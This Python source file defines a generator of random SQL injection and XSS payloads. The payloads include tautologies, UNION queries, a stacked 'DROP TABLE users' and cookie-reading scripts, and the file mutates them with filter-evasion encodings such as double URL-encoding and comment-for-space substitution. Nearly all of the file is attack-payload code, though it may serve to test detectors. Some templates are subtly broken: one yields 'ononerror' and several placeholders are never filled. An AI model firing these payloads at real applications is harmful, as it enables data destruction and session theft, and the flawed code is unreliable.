import random
import urllib.parse
import base64
import string

class AttackGenerator:
    def __init__(self):
        self.sqli_templates = [
            "' OR '{cond}' --",
            "'; {command}; --",
            "1 UNION SELECT {columns} --",
            "AND (SELECT {subquery})",
            "WAITFOR DELAY '{delay}'--",
            "benchmark({num},MD5(1))#",
            "AND {bool_expr}=CAST({payload} AS NUMERIC)",
        ]

        self.xss_templates = [
            "<script>{code}</script>",
            "<img src=x onerror={code}>",
            "javascript:{code}",
            "<svg onload={code}>",
            "<{tag} on{event}={code}>",
            "<script>eval(atob('{b64}'))</script>",
        ]

        self.payload_snippets = [
            "alert(1)", "prompt(1)", "confirm(document.domain)",
            "alert(document.cookie)", "eval(name)"
        ]

    def _random_mutate(self, payload: str, intensity: int = 3) -> str:
        mutations = [
            lambda p: p.upper(),
            lambda p: p.lower(),
            lambda p: urllib.parse.quote(p),
            lambda p: urllib.parse.quote(urllib.parse.quote(p)),  # double encode
            lambda p: p.replace(" ", "/**/"),
            lambda p: ''.join(random.choice([c.upper(), c.lower()]) for c in p),
            lambda p: base64.b64encode(p.encode()).decode(),
        ]
        for _ in range(intensity):
            payload = random.choice(mutations)(payload)
        return payload

    def generate_sqli(self, complexity: str = "high") -> str:
        template = random.choice(self.sqli_templates)
        intensity = 5 if complexity == "high" else 3

        if "{cond}" in template:
            payload = template.format(cond=random.choice(["1=1", "2=2"]))
        elif "{command}" in template:
            payload = template.format(command="DROP TABLE users")
        elif "{columns}" in template:
            payload = template.format(columns="1,2,3")
        else:
            payload = template

        return self._random_mutate(payload, intensity)

    def generate_xss(self, complexity: str = "high") -> str:
        template = random.choice(self.xss_templates)
        intensity = 5 if complexity == "high" else 3

        code = random.choice(self.payload_snippets)
        if "{b64}" in template:
            code = base64.b64encode(code.encode()).decode()

        payload = template.format(code=code, tag="img", event="onerror", b64=code)
        return self._random_mutate(payload, intensity)

    def generate_random_attack(self, complexity: str = "high") -> dict:
        if random.random() < 0.5:
            payload = self.generate_sqli(complexity)
            attack_type = "SQLI"
        else:
            payload = self.generate_xss(complexity)
            attack_type = "XSS"
        
        return {
            "type": attack_type,
            "payload": payload,
            "complexity": complexity
        }


# Test the class when running directly
if __name__ == "__main__":
    gen = AttackGenerator()
    print("✅ AttackGenerator loaded successfully!\n")
    for i in range(5):
        attack = gen.generate_random_attack("high")
        print(f"{i+1}. [{attack['type']}] {attack['payload'][:100]}...")